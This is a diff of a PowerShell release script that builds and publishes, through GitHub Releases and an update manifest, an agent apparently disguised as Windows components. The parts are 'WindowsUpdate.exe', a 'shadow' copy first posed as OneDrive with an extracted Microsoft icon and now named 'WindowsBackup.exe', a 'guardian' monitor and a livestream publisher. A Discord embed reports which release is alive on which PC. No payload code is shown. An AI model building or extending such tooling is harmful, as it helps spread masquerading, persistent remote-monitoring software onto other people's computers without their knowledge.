@@ -1,8 +1,9 @@
-# release.ps1 - build WindowsUpdate.exe + OneDrive.exe (shadow) + update manifest.json
-# + git commit/push + GitHub Release. Auto-installs git, gh CLI, dotnet SDK, and
-# ImageMagick via winget if missing. Fetches a OneDrive-cloud PNG from the
-# configured URL and converts it into a multi-resolution .ico the OneDrive build
-# embeds as its application icon.
+# release.ps1 - build WindowsUpdate.exe + WindowsBackup.exe (shadow) +
+# WindowsUpdateMonitor.exe (guardian) + LivePublisher.exe + update manifest.json
+# + git commit/push + GitHub Release. Auto-installs git, gh CLI, dotnet SDK via
+# winget if missing. v1.0.42+ no longer extracts a OneDrive icon — the shadow
+# is now WindowsBackup, not an OneDrive impostor, so no stolen Microsoft icon
+# is needed. Default .NET icon is used.
 #
 # ASCII-only script body: PowerShell 5.1 reads .ps1 files without a BOM as the
 # system ANSI codepage. Any non-ASCII character becomes mojibake and the parser
@@ -26,19 +27,11 @@ $ErrorActionPreference = "Stop"
 # ---------------- Paths ----------------
 $agentSource         = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
 $primaryExe          = Join-Path $agentSource "publish_out\WindowsUpdate.exe"
-$shadowExe           = Join-Path $agentSource "publish_out_shadow\OneDrive.exe"
+$shadowExe           = Join-Path $agentSource "publish_out_shadow\WindowsBackup.exe"
 $guardianExe         = Join-Path $agentSource "publish_out_guardian\WindowsUpdateMonitor.exe"
 $livePublisherExe    = "C:\Users\mohba\OneDrive\Desktop\pranks\livestream\LivePublisher.exe"
 $manifestDir         = $PSScriptRoot
 $manifestPath        = Join-Path $manifestDir "manifest.json"
-$iconDest            = Join-Path $agentSource "Assets\OneDrive.ico"
-
-# ---------------- Icon source config ----------------
-# Primary source: extract the icon directly from the local Microsoft OneDrive
-# install (every Windows 10/11 system Microsoft ships ships with it) via
-# System.Drawing.Icon.ExtractAssociatedIcon. This avoids depending on an
-# external CDN and gets the official OneDrive icon rather than a Wikipedia logo.
-$iconLocalSource     = Join-Path $env:LOCALAPPDATA "Microsoft\OneDrive\OneDrive.exe"
 
 # ---------------- GitHub repo ----------------
 $ghOwner = "sayamuhbani59-collab"
@@ -97,7 +90,6 @@ Refresh-Path
 Ensure-Tool -Command "git"     -WingetId "Git.Git"                 -DisplayName "Git"
 Ensure-Tool -Command "dotnet"  -WingetId "Microsoft.DotNet.SDK.8"  -DisplayName ".NET 8 SDK"
 Ensure-Tool -Command "gh"      -WingetId "GitHub.cli"              -DisplayName "GitHub CLI"
-# ImageMagick not needed anymore - icon is extracted directly from OneDrive.exe.
 
 # Don't use 2>&1 on native commands: PS 5.1 wraps every stderr line as a
 # NativeCommandError which, combined with $ErrorActionPreference=Stop, halts the
@@ -116,32 +108,7 @@ if ($authExit -ne 0) {
     if ($LASTEXITCODE -ne 0) { Fail "gh auth login aborted - cannot create release." }
 }
 
-# ---------------- 1) Icon extraction from local OneDrive.exe (idempotent) --------
-if (-not (Test-Path $iconDest)) {
-    $assetsDir = Split-Path -Parent $iconDest
-    if (-not (Test-Path $assetsDir)) { New-Item -ItemType Directory -Force $assetsDir | Out-Null }
-    if (-not (Test-Path $iconLocalSource)) {
-        Write-Host "[ICON] Local OneDrive not found at $iconLocalSource - OneDrive.csproj will build with default .NET icon (ApplicationIcon tag is conditional)." -ForegroundColor Yellow
-    } else {
-        Write-Host "[ICON] Extracting icon from local OneDrive.exe..." -ForegroundColor Cyan
-        try {
-            Add-Type -AssemblyName System.Drawing -ErrorAction Stop
-            $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconLocalSource)
-            if ($null -eq $icon) { Fail "ExtractAssociatedIcon returned null" }
-            try {
-                $fs = [System.IO.File]::Create($iconDest)
-                try { $icon.Save($fs) } finally { $fs.Close() }
-            } finally { $icon.Dispose() }
-            Write-Host "       -> $iconDest" -ForegroundColor Green
-        } catch {
-            Fail "Icon extraction failed: $($_.Exception.Message)"
-        }
-    }
-} else {
-    Write-Host "[ICON] Icon present ($iconDest) - skip extract." -ForegroundColor DarkGray
-}
-
-# ---------------- 2) Stamp ReleaseInfo.cs with the version + UTC build time ----------
+# ---------------- 1) Stamp ReleaseInfo.cs with the version + UTC build time ----------
 # The agent's startup Discord embed reads these two constants and prints them
 # in the Version field so an operator can see at a glance which release is
 # alive on which PC. We rewrite the file with the current -Version argument
@@ -174,11 +141,11 @@ if (-not $SkipBuild) {
     }
     finally { Pop-Location }
 
-    Write-Host "[BUILD] OneDrive.exe (shadow, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
+    Write-Host "[BUILD] WindowsBackup.exe (shadow, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
     Push-Location $agentSource
     try {
-        dotnet publish OneDrive.csproj -c Release -o .\publish_out_shadow -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
-        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish OneDrive.csproj failed" }
+        dotnet publish WindowsBackup.csproj -c Release -o .\publish_out_shadow -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
+        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish WindowsBackup.csproj failed" }
     }
     finally { Pop-Location }
 
@@ -232,7 +199,7 @@ if ($havePublisher) {
 # ---------------- 4) Update manifest.json ----------------
 Write-Host "[MANI] Updating manifest.json..." -ForegroundColor Cyan
 $primaryUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdate.exe"
-$shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/OneDrive.exe"
+$shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsBackup.exe"
 $guardianUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdateMonitor.exe"
 $livePublisherUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/LivePublisher.exe"
 $manifestObj = [ordered]@{
@@ -262,7 +229,7 @@ try {
     git add manifest.json README.md .gitignore release.ps1 install.ps1 guardian.ps1 2>$null | Out-Null
     $status = git status --porcelain
     if ($status) {
-        git commit -m "release v$Version (dual exe: WindowsUpdate + OneDrive shadow)" | Out-Null
+        git commit -m "release v$Version (dual exe: WindowsUpdate + WindowsBackup shadow)" | Out-Null
         git push
         if ($LASTEXITCODE -ne 0) { Fail "git push failed - check remote/credentials" }
         Write-Host "       -> pushed to $ghOwner/$ghRepo main" -ForegroundColor Green
